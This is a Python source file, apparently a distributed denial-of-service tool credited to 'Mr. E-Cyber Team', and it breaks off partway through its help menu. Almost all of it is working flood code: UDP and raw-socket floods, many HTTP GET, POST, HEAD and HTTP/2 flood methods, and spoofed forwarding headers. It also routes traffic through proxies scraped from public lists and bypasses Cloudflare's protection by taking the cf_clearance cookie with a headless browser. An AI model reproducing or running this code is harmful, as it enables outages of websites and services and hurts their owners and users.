# -*- coding: utf-8 -*-
# Made by Mr. E-Cyber Team
from os import system, name
import getpass
import os, threading, requests, sys, cloudscraper, datetime, time, socket, socks, ssl, random, httpx
from urllib.parse import urlparse
from requests.cookies import RequestsCookieJar
import undetected_chromedriver as webdriver
from sys import stdout
from colorama import Fore, init

def countdown(t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    while True:
        if (until - datetime.datetime.now()).total_seconds() > 0:
            stdout.flush()
            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack status => " + str((until - datetime.datetime.now()).total_seconds()) + " sec left ")
        else:
            stdout.flush()
            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack Done !                                   \n")
            return

#region get
def get_target(url):
    url = url.rstrip()
    target = {}
    target['uri'] = urlparse(url).path
    if target['uri'] == "":
        target['uri'] = "/"
    target['host'] = urlparse(url).netloc
    target['scheme'] = urlparse(url).scheme
    if ":" in urlparse(url).netloc:
        target['port'] = urlparse(url).netloc.split(":")[1]
    else:
        target['port'] = "443" if urlparse(url).scheme == "https" else "80"
        pass
    return target

def get_proxylist(type):
    if type == "SOCKS5":
        r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=1000000&country=all").text
        r += requests.get("https://www.proxy-list.download/api/v1/get?type=socks5").text
        open("./resources/socks5.txt", 'w').write(r)
        r = r.rstrip().split('\r\n')
        return r
    elif type == "HTTP":
        r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=1000000&country=all").text
        r += requests.get("https://www.proxy-list.download/api/v1/get?type=http").text
        open("./resources/http.txt", 'w').write(r)
        r = r.rstrip().split('\r\n')
        return r

def get_proxies():
    global proxies
    if not os.path.exists("./proxy.txt"):
        stdout.write(Fore.MAGENTA+" [*]"+Fore.WHITE+" You Need Proxy File ( ./proxy.txt )\n")
        return False
    proxies = open("./proxy.txt", 'r').read().split('\n')
    return True

def get_cookie(url):
    global useragent, cookieJAR, cookie
    options = webdriver.ChromeOptions()
    arguments = [
    '--no-sandbox', '--disable-setuid-sandbox', '--disable-infobars', '--disable-logging', '--disable-login-animations',
    '--disable-notifications', '--disable-gpu', '--headless', '--lang=ko_KR', '--start-maxmized',
    '--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 14_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 DuckDuckGo/7 Safari/605.1.15' 
    ]
    for argument in arguments:
        options.add_argument(argument)
    driver = webdriver.Chrome(options=options)
    driver.implicitly_wait(3)
    driver.get(url)
    for _ in range(60):
        cookies = driver.get_cookies()
        tryy = 0
        for i in cookies:
            if i['name'] == 'cf_clearance':
                cookieJAR = driver.get_cookies()[tryy]
                useragent = driver.execute_script("return navigator.userAgent")
                cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
                driver.quit()
                return True
            else:
                tryy += 1
                pass
        time.sleep(1)
    driver.quit()
    return False

def spoof(target):
    addr = [192, 168, 0, 1, 80, 5903]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    addr[4] = str(random.randrange(2, 200))
    addr[5] = str(random.randrange(5800, 6500))
    spoofip = addr[0] + d + addr[1] + d + addr[2] + d + addr[3] + d + addr[4] + d + addr[5]
    return (
        "X-Forwarded-Proto: Http\r\n"
        f"X-Forwarded-Host: {target['host']}, 1.1.1.1\r\n"
        f"Via: {spoofip}\r\n"
        f"Client-IP: {spoofip}\r\n"
        f'X-Forwarded-For: {spoofip}\r\n'
        f'Real-IP: {spoofip}\r\n'
    )

##############################################################################################
def get_info_l7():
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"URL      "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    target = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"THREAD   "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    thread = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"TIME(s)  "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    t = input()
    return target, thread, t

def get_info_sp():
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"URL                          "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    target = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"METHODS GET/POST/PUT/DELETE  "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    methods = input()
    return target, methods
    
def get_info_uam():
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"URL  "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    uamtarget = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"TIME  "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    uamtime = input()
    return uamtarget, uamtime
    
def get_info_gold():
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"URL               "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    gtarget = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"WORKER 5-50       "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    gworkers = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"CONNECTION 10-1000"+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    gconnection = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"DEBUG True/False  "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    gdebug = input()
    return gtarget, gworkers, gconnection, gdebug

def get_info_l4():
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"IP       "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    target = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"PORT     "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    port = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"THREAD   "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    thread = input()
    stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"TIME(s)  "+Fore.LIGHTCYAN_EX+": "+Fore.LIGHTGREEN_EX)
    t = input()
    return target, port, thread, t
##############################################################################################

#region layer4
def runflooder(host, port, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    rand = random._urandom(7000000)
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=flooder, args=(host, port, rand, until))
            thd.start()
        except:
            pass

def flooder(host, port, rand, until_datetime):
    sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            sock.sendto(rand, (host, int(port)))
        except:
            sock.close()
            pass


def runsender(host, port, th, t, payload):
    if payload == "":
        payload = random._urandom(7000000)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    #payload = Payloads[method]
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=sender, args=(host, port, until, payload))
            thd.start()
        except:
            pass

def sender(host, port, until_datetime, payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            sock.sendto(payload, (host, int(port)))
        except:
            sock.close()
            pass
            
#endregion

#region METHOD

#region HEAD

def Launch(url, th, t, method): #testing
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            exec("threading.Thread(target=Attack"+method+", args=(url, until)).start()")
        except:
            pass


def LaunchHEAD(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackHEAD, args=(url, until))
            thd.start()
        except:
            pass

def AttackHEAD(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.head(url)
            requests.head(url)
        except:
            pass
#endregion

#region POST
def LaunchPOST(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPOST, args=(url, until))
            thd.start()
        except:
            pass

def AttackPOST(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.post(url)
            requests.post(url)
        except:
            pass
#endregion

#region RAW
def LaunchRAW(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackRAW, args=(url, until))
            thd.start()
        except:
            pass

def AttackRAW(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.get(url)
            requests.get(url)
        except:
            pass
#endregion

#region PXRAW
def LaunchPXRAW(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPXRAW, args=(url, until))
            thd.start()
        except:
            pass

def AttackPXRAW(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        proxy = 'http://'+str(random.choice(list(proxies)))
        proxy = {
            'http': proxy,   
            'https': proxy,
        }
        try:
            requests.get(url, proxies=proxy)
            requests.get(url, proxies=proxy)
        except:
            pass
#endregion

#region PXSOC
def LaunchPXSOC(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req =  "GET " +target['uri'] + " HTTP/1.1\r\n"
    req += "Host: " + target['host'] + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPXSOC, args=(target, until, req))
            thd.start()
        except:
            pass

def AttackPXSOC(target, until_datetime, req):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            proxy = random.choice(list(proxies)).split(":")
            if target['scheme'] == 'https':
                s = socks.socksocket()
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
                s.connect((str(target['host']), int(target['port'])))
                s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
            else:
                s = socks.socksocket()
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
                s.connect((str(target['host']), int(target['port'])))
            try:
                for _ in range(300):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            return
#endregion

#region SOC
def LaunchSOC(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackSOC, args=(target, until, req))
            thd.start()
        except:
            pass

def AttackSOC(target, until_datetime, req):
    if target['scheme'] == 'https':
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
    else:
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            try:
                for _ in range(300):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            pass
#endregion

def LaunchPPS(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPPS, args=(target, until))
            thd.start()
        except:
            pass

def AttackPPS(target, until_datetime): #
    if target['scheme'] == 'https':
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
    else:
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            try:
                for _ in range(300):
                    s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
            except:
                s.close()
        except:
            pass

def LaunchNULL(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "User-Agent: null\r\n"
    req += "Referrer: null\r\n"
    req += spoof(target) + "\r\n"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackNULL, args=(target, until, req))
            thd.start()
        except:
            pass

def AttackNULL(target, until_datetime, req): #
    if target['scheme'] == 'https':
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
    else:
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            try:
                for _ in range(300):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            pass

def LaunchSPOOF(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += spoof(target)
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackSPOOF, args=(target, until, req))
            thd.start()
        except:
            pass

def AttackSPOOF(target, until_datetime, req): #
    if target['scheme'] == 'https':
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
    else:
        s = socks.socksocket()
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            try:
                for _ in range(300):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            pass

def LaunchPXSPOOF(url, th, t, proxy):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += spoof(target)
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(th)):
        try:
            randomproxy = random.choice(proxy)
            thd = threading.Thread(target=AttackPXSPOOF, args=(target, until, req, randomproxy))
            thd.start()
        except:
            pass

def AttackPXSPOOF(target, until_datetime, req, proxy): #
    proxy = proxy.split(":")
    print(proxy)
    try:
        if target['scheme'] == 'https':
            s = socks.socksocket()
            #s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            s.connect((str(target['host']), int(target['port'])))
            s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
        else:
            s = socks.socksocket()
            #s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            s.connect((str(target['host']), int(target['port'])))
    except:
        return
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            try:
                for _ in range(300):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            pass

#region CFB
def LaunchCFB(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFB, args=(url, until, scraper))
            thd.start()
        except:
            pass

def AttackCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url, timeout=15)
            scraper.get(url, timeout=15)
        except:
            pass
#endregion

#region PXCFB
def LaunchPXCFB(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPXCFB, args=(url, until, scraper))
            thd.start()
        except:
            pass

def AttackPXCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            proxy = {
                    'http': 'http://'+str(random.choice(list(proxies))),   
                    'https': 'http://'+str(random.choice(list(proxies))),
            }
            scraper.get(url, proxies=proxy)
            scraper.get(url, proxies=proxy)
        except:
            pass
#endregion

#region CFPRO
def LaunchCFPRO(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    session = requests.Session()
    scraper = cloudscraper.create_scraper(sess=session)
    jar = RequestsCookieJar()
    jar.set(cookieJAR['name'], cookieJAR['value'])
    scraper.cookies = jar
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFPRO, args=(url, until, scraper))
            thd.start()
        except:
            pass

def AttackCFPRO(url, until_datetime, scraper):
    headers = {
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 DuckDuckGo/7 Safari/605.1.15',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'TE': 'trailers',
    }
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url=url, headers=headers, allow_redirects=False)
            scraper.get(url=url, headers=headers, allow_redirects=False)
        except:
            pass
#endregion

#region CFSOC
def LaunchCFSOC(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    target = get_target(url)
    req =  'GET '+ target['uri'] +' HTTP/1.1\r\n'
    req += 'Host: ' + target['host'] + '\r\n'
    req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
    req += 'Accept-Encoding: gzip, deflate, br\r\n'
    req += 'Accept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
    req += 'Cache-Control: max-age=0\r\n'
    req += 'Cookie: ' + cookie + '\r\n'
    req += f'sec-ch-ua: "Chromium";v="116", "Google Chrome";v="116"\r\n'
    req += 'sec-ch-ua-mobile: ?0\r\n'
    req += 'sec-ch-ua-platform: "Windows"\r\n'
    req += 'sec-fetch-dest: empty\r\n'
    req += 'sec-fetch-mode: cors\r\n'
    req += 'sec-fetch-site: same-origin\r\n'
    req += 'Connection: Keep-Alive\r\n'
    req += 'User-Agent: ' + useragent + '\r\n\r\n\r\n'
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFSOC,args=(until, target, req,))
            thd.start()
        except:  
            pass

def AttackCFSOC(until_datetime, target, req):
    if target['scheme'] == 'https':
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
        packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
    else:
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            for _ in range(10):
                packet.send(str.encode(req))
        except:
            packet.close()
            pass
#endregion

#region testzone
def attackSKY(url, timer, threads):
    for i in range(int(threads)):
        threading.Thread(target=LaunchSKY, args=(url, timer)).start()

def LaunchSKY(url, timer):
    proxy = random.choice(proxies).strip().split(":")
    timelol = time.time() + int(timer)
    req =  "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Sec-Fetch-Site: same-origin\r\n"
    req += "Sec-GPC: 1\r\n"
    req += "Sec-Fetch-Mode: navigate\r\n"
    req += "Sec-Fetch-Dest: document\r\n"
    req += "Upgrade-Insecure-Requests: 1\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        try:
            s = socks.socksocket()
            s.connect((str(urlparse(url).netloc), int(443)))
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            ctx = ssl.SSLContext()
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            s.send(str.encode(req))
            try:
                for _ in range(300):
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()

def attackSTELLAR(url, timer, threads):
    for i in range(int(threads)):
        threading.Thread(target=LaunchSTELLAR, args=(url, timer)).start()

def LaunchSTELLAR(url, timer):
    timelol = time.time() + int(timer)
    req =  "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Sec-Fetch-Site: same-origin\r\n"
    req += "Sec-GPC: 1\r\n"
    req += "Sec-Fetch-Mode: navigate\r\n"
    req += "Sec-Fetch-Dest: document\r\n"
    req += "Upgrade-Insecure-Requests: 1\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(urlparse(url).netloc), int(443)))
            ctx = ssl.create_default_context()
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            s.send(str.encode(req))
            try:
                for _ in range(300):
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()
#endregion

def LaunchHTTP2(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=AttackHTTP2, args=(url, until)).start()

def AttackHTTP2(url, until_datetime):
    headers = {
            'User-Agent': random.choice(ua),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'TE': 'trailers',
            }
    client = httpx.Client(http2=True)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            client.get(url, headers=headers)
            client.get(url, headers=headers)
        except:
            pass

def LaunchPXHTTP2(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=AttackHTTP2, args=(url, until)).start()

def AttackPXHTTP2(url, until_datetime):
    headers = {
            'User-Agent': random.choice(ua),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'TE': 'trailers',
            }
    
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            client = httpx.Client(
                http2=True,
                proxies={
                    'http://': 'http://'+random.choice(proxies),
                    'https://': 'http://'+random.choice(proxies),
                }
             )
            client.get(url, headers=headers)
            client.get(url, headers=headers)
        except:
            pass

def test1(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    target = get_target(url)
    req =  'GET '+ target['uri'] +' HTTP/1.1\r\n'
    req += 'Host: ' + target['host'] + '\r\n'
    req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
    req += 'Accept-Encoding: gzip, deflate, br\r\n'
    req += 'Accept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
    req += 'Cache-Control: max-age=0\r\n'
    #req += 'Cookie: ' + cookie + '\r\n'
    req += f'sec-ch-ua: "Chromium";v="116", "Google Chrome";v="116"\r\n'
    req += 'sec-ch-ua-mobile: ?0\r\n'
    req += 'sec-ch-ua-platform: "Windows"\r\n'
    req += 'sec-fetch-dest: empty\r\n'
    req += 'sec-fetch-mode: cors\r\n'
    req += 'sec-fetch-site: same-origin\r\n'
    req += 'Connection: Keep-Alive\r\n'
    req += 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en\r\n\r\n\r\n'
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=test2,args=(until, target, req,))
            thd.start()
        except:  
            pass

def test2(until_datetime, target, req):
    if target['scheme'] == 'https':
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
        packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
    else:
        packet = socks.socksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            for _ in range(30):
                packet.send(str.encode(req))
        except:
            packet.close()
            pass


#endregion

def clear(): 
    if name == 'nt': 
        system('cls')
    else: 
        system('clear')
##############################################################################################
def help():
    clear()
    stdout.write(f"""
\033[1;31;40m███████╗██╗░░██╗███████╗░█████╗░██╗░░░██╗████████╗░█████╗░██████╗░
██╔════╝╚██╗██╔╝██╔════╝██╔══██╗██║░░░██║╚══██╔══╝██╔══██╗██╔══██╗
█████╗░░░╚███╔╝░█████╗░░██║░░╚═╝██║░░░██║░░░██║░░░██║░░██║██████╔╝
\033[1;37;40m██╔══╝░░░██╔██╗░██╔══╝░░██║░░██╗██║░░░██║░░░██║░░░██║░░██║██╔══██╗
███████╗██╔╝╚██╗███████╗╚█████╔╝╚██████╔╝░░░██║░░░╚█████╔╝██║░░██║
╚══════╝╚═╝░░╚═╝╚══════╝░╚════╝░░╚═════╝░░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝
                       
                      \33[0;32mH E L P  -  M E N U
                         
""")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m╔═════════════════════════════════════════════════════╗\n")
    stdout.write(""+Fore.LIGHTCYAN_EX+"\033[1;31;40m║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"\33[0;32mLAYER7   "+Fore.LIGHTCYAN_EX+">>>"+Fore.LIGHTWHITE_EX+" \33[0;32mSHOW METHODS LAYER7                  "+Fore.LIGHTCYAN_EX+"\033[1;31;40m║\n")
